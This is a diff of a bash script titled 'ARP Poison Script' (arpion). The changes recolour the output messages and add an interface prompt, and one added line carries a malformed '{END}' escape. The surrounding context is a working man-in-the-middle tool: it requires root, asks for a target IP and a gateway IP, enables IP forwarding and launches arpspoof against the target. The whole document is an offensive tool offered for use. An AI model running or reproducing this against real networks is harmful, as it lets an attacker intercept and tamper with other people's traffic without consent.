@@ -35,18 +35,19 @@ ver=$(echo arpion_1.0)
 
 #################################Start script and validation####################################
 if [[ $EUID -ne 0 ]]; then
-echo -e "${RED_TEXT}Script must be run as root!${END}"
+echo -e "${WARNING}Script must be run as root!${END}"
 exit 1
 else
-echo -e "${RED_TEXT}#######################################${END}"
-echo -e "${RED_TEXT}########${END}${BLUE} ARP Poison Script${END}${RED_TEXT} ############${END}"
-echo -e "${RED_TEXT}#######################################${END}"
+echo -e "${INTRO_TEXT}#######################################${END}"
+echo -e "${INTRO_TEXT}########${END} ARP Poison Script${INTRO_TEXT} ############${END}"
+echo -e "${INTRO_TEXT}#######################################${END}"
 echo -e "${BLUE}Author: Webbhatt${END}"
 echo -e "${BLUE}Website:http://www.webbhatt.com${END}"
 echo "What interface? (default: eth0)"
 read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
 case $response in
 [yY][eE][sS]|[yY])
+echo -n "What interface would you like to use?"
 	read iface
 ;;
     *)
@@ -58,12 +59,12 @@ echo -n "Please enter target's IP: "
 read victimIP
 echo -n "Please enter Gateway's IP: "
 read gatewayIP
-echo -e "--==[Targets]==--"
+echo -e "${WARNING}[TARGETS]{END}"
 echo -e "${RED_TEXT}Target:${END} $victimIP"
 echo -e "${RED_TEXT}Gateway:${END} $gatewayIP"
-echo -e "${BLUE}[*] Enabling IP Forwarding ${END}"
+echo -e "${SUCCESS}[*] Enabling IP Forwarding ${END}"
 echo "1" > /proc/sys/net/ipv4/ip_forward
-echo -e "${BLUE}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
+echo -e "${SUCCESS}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
 arpspoof -i $iface -t $victimIP $gatewayIP
 read -r -p "Do you want to go back to the Main menu? [y/N] " response
 case $response in
